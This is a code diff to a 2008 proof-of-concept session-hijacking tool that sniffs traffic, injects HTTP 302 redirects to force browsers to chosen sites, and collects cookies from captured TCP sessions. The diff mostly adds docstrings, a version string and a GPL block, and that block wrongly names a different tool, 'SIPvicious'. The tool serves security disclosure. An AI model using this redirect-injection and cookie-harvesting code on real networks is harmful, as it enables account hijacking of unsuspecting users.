@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# proof of concept by sandro gauci
+# proof of concept by sandro gauci <sandro@enablesecurity.com>
 # enablesecurity 2008 
 # 20080809
 # what it does: forces web browsers to go to specific sites. This has the effect
@@ -15,9 +15,30 @@
 from scapy import *
 from helper import *
 from proxy import DrukqsProxy
-import anydbm
 import logging
+import sys
 
+__GPL__ = """
+
+   SIPvicious SIP scanner searches for SIP devices on a given network
+   Copyright (C) 2007  Sandro Gauci <sandrogauc@gmail.com>
+
+   This program is free software: you can redistribute it and/or modify
+   it under the terms of the GNU General Public License as published by
+   the Free Software Foundation, either version 3 of the License, or
+   (at your option) any later version.
+   
+   This program is distributed in the hope that it will be useful,
+   but WITHOUT ANY WARRANTY; without even the implied warranty of
+   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+   GNU General Public License for more details.
+   
+   You should have received a copy of the GNU General Public License
+   along with this program.  If not, see <http://www.gnu.org/licenses/>.
+"""
+if sys.hexversion < 0x020400f0:
+    sys.stderr.write("Please update to python 2.4 or greater to run Sipvicious\r\n")
+    sys.exit(1)
 
 redirmsg = ["HTTP/1.1 302 Found",
                         "Location: %(url)s",
@@ -32,7 +53,10 @@ redirpkt = '\r\n'.join(redirmsg)
 redirpkt += '\r\n'*100
 hijacked = dict()
 
+__version__='0.2'
+__author__="Sandro Gauci <sandro@enablesecurity.com>"
 class tcpsessions:
+        """ Sets up TCP Sessions and able to reconstruct fragmented tcp packets """
         import logging
         def __init__(self):
                 global victimheaders
@@ -42,6 +66,7 @@ class tcpsessions:
                 self.victimheaders = victimheaders
         
         def addpacket(self,packet):
+                """adds the packet to the list"""
                 if packet.haslayer(Raw):
                         self.log.debug('we have a packet with payload')
                         ipsrc = packet.getlayer(IP).src
@@ -59,6 +84,7 @@ class tcpsessions:
                                 self.log.debug(self.packets[k])
         
         def getcookies(self):
+                """ searches through all sessions looking for cookies"""
                 cookies = dict()
                 for k in self.packets.keys():
                         self.log.debug(self.packets[k])
@@ -217,14 +243,18 @@ def getconfig(fn):
 
 if __name__ == "__main__":
         from optparse import OptionParser
-        o = OptionParser(usage="just run %prog. use --help to print out the help")
+        o = OptionParser(usage="just run %prog. use --help to print out the help",version="%prog v"+str(__version__)+__GPL__)
         o.add_option('-i',help='specify an interface', dest="interface")
         o.add_option('-v', help="increase verbosity", dest='verbose', action='count' )
-        o.add_option('-q', help="quiet mode", dest='quiet', default=False, action='store_true' )
-        o.add_option('-j', help="interface to use to inject packets with", dest="injiface")
+        o.add_option('-q', help="quiet mode", dest='quiet', default=False,
+                     action='store_true' )
+        o.add_option('-j', help="interface to use to inject packets with",
+                     dest="injiface")
         o.add_option('-W', help="WEP key", dest="wepkey")
-        o.add_option('-c', help="Specify a custom configuration file", dest='config', default='surfjack.ini')
-        o.add_option('--dontignoreself', help="Disable ignoring of own traffic", dest="ignoreself", default=True, action="store_false")
+        o.add_option('-c', help="Specify a custom configuration file", dest='config',
+                     default='surfjack.ini')
+        o.add_option('--dontignoreself', help="Disable ignoring of own traffic",
+                     dest="ignoreself", default=True, action="store_false")
         options, args = o.parse_args()
         loglevel = calcloglevel(options)
         logging.basicConfig(level=loglevel)
